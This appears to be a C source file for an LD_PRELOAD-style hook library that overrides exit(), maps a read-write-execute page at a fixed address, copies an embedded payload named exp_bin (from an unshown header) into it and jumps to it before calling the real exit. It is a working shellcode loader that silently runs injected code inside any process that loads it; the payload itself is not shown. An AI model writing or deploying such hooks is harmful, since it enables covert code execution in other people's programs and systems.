#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

#include "exp.h"

int probe(unsigned long addr, char* shellcode, int len) {
    void *rwx = mmap(
        (void*)addr, len, 
        PROT_READ | PROT_WRITE | PROT_EXEC, 
        MAP_PRIVATE | MAP_ANONYMOUS, 
        -1, 
        0
    );
    if (rwx == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }
    memcpy(rwx, shellcode, len);

    // Jump to the mapped memory and execute
    void (*func)() = rwx;
    func();

    // Clean up
    munmap(rwx, len);\
    return EXIT_SUCCESS;
}

typedef void (*exit_fn_t)(int status);

void exit(int status) {
    printf("hooked exit(%d)\n", status);
    probe(0x800000, exp_bin, exp_bin_len);
    
    exit_fn_t real_exit = (exit_fn_t)dlsym(RTLD_NEXT, "exit");
    real_exit(status);
}